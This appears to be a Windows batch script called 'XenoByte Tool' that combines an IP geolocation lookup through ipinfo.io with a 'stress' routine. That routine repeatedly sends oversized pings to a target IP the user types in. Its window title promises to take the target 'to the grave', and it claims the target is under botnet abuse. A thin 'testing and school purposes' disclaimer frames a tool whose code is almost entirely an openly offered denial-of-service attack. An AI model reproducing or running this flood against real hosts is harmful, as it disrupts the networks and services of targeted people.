@echo off
title XenoByte Tool v.2.1 by @ChaosVinny
echo        ++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++
echo        +       XenoByte Tool v.2.1 by @ChaosVinny          +
echo        ++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++ 
echo.
echo                   ( X  e  n  o  B  y  t  e )
echo.
color e
echo   I totaly disagree (Mi dissocio) with what you will do with this tool
echo.
echo   This tool was created for testing and school purposes.
echo.
echo   TYPE Agree - To Agree the TOS
echo.
echo.
:hub
set /p var= CHAT ~
if %var%==Dash goto iplook

:iplook
@echo off
title XenoByte Tool v.2.1 by @ChaosVinny
color 07
setlocal ENABLEDELAYEDEXPANSION
set webclient=webclient
if exist "%temp%\%webclient%.vbs" del "%temp%\%webclient%.vbs" /f /q /s >nul
if exist "%temp%\response.txt" del "%temp%\response.txt" /f /q /s >nul
:menu
cls
echo 1.) Check Your IP
echo 2.) Search up an IP
echo 3.) Check the IP
goto action
:input
goto stress
echo.
echo Please enter a valid input option.
echo.
:action
echo.
set /p action=Please Type A Number: 
if '%action%'=='1' echo sUrl = "http://ipinfo.io/json" > %temp%\%webclient%.vbs & goto localip
if '%action%'=='2' goto iplookup
goto input
:iplookup
cls
echo.
echo                          Type an IP to lookup
echo.
set ip=127.0.0.1
set /p ip=IP: 
echo sUrl = "http://ipinfo.io/%ip%/json" > %temp%\%webclient%.vbs
:localip
cls
echo set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0") >> %temp%\%webclient%.vbs
echo oHTTP.open "GET", sUrl,false >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded" >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Length", Len(sRequest) >> %temp%\%webclient%.vbs
echo oHTTP.send sRequest >> %temp%\%webclient%.vbs
echo HTTPGET = oHTTP.responseText >> %temp%\%webclient%.vbs
echo strDirectory = "%temp%\response.txt" >> %temp%\%webclient%.vbs
echo set objFSO = CreateObject("Scripting.FileSystemObject") >> %temp%\%webclient%.vbs
echo set objFile = objFSO.CreateTextFile(strDirectory) >> %temp%\%webclient%.vbs
echo objFile.Write(HTTPGET) >> %temp%\%webclient%.vbs
echo objFile.Close >> %temp%\%webclient%.vbs
echo Wscript.Quit >> %temp%\%webclient%.vbs
start %temp%\%webclient%.vbs
set /a requests=0
echo.
rem echo Waiting for API response. . .
echo  Looking up IP Address. . .
:checkresponseexists
set /a requests=%requests% + 1
if %requests% gtr 7 goto failed
IF EXIST "%temp%\response.txt" (
goto response_exist
) ELSE (
ping 127.0.0.1 -n 2 -w 1000 >nul
goto checkresponseexists
)
:failed
taskkill /f /im wscript.exe >nul
del "%temp%\%webclient%.vbs" /f /q /s >nul
echo.
echo Did not receive a response from the API.
echo.
pause
goto menu
:response_exist
cls
echo.
echo Information for "%IP%"
for /f "delims= 	" %%i in ('findstr /i "," %temp%\response.txt') do (
	set data=%%i
	set data=!data:,=!
	set data=!data:""=Not Listed!
	set data=!data:"=!
	set data=!data:hostname:=Hostname: !
        set data=!data:country:=Country: !
	set data=!data:region:=State or Provinence: !
	set data=!data:city:=City or Town: !		                        	                        
	set data=!data:org:=Internet Service Provider: !		        		                	                	                        
	set data=!data:postal:=Postal Code: !	                        
	set data=!data:timezone:=Timezone: !	                        
	echo !data!                                                               
)
echo.
del "%temp%\%webclient%.vbs" /f /q /s >nul
del "%temp%\response.txt" /f /q /s >nul
goto hub
if '%ip%'=='' goto menu
goto iplookup
cls
:stress
@echo off
color e
title Made by @ChaosVinny forked from @xPr3f3tcVu0t0x
echo        ++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++
echo        +       XenoByte Tool v.2.1 by @ChaosVinny          +
echo        ++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++ 
echo.
echo                   ( X  e  n  o  B  y  t  e )
echo.
echo.
echo.
:hub
set /p var=Enter IP~
title Preparing To Take ~%var%~ To The Grave
echo ================================
echo Pinging Target IP "%var%"
echo ================================
:d
echo ==================================
echo %var% sta subendo l'abuso da Parte della Botnet
echo ==================================
:x
ping  -l 9999 -w 10 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
color 5
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
IF ERRORLEVEL 1 goto f
color e
cls
GoTo d
:f
color 40            
echo  _____  ____  ____  __    ____  _  _  ____ 
echo (  _  )( ___)( ___)(  )  (_  _)( \( )( ___)
echo )(_)(  )__)  )__)  )(__  _)(_  )  (  )__) 
echo (_____)(__)  (__)  (____)(____)(_)\_)(____)                          
color 04
goto x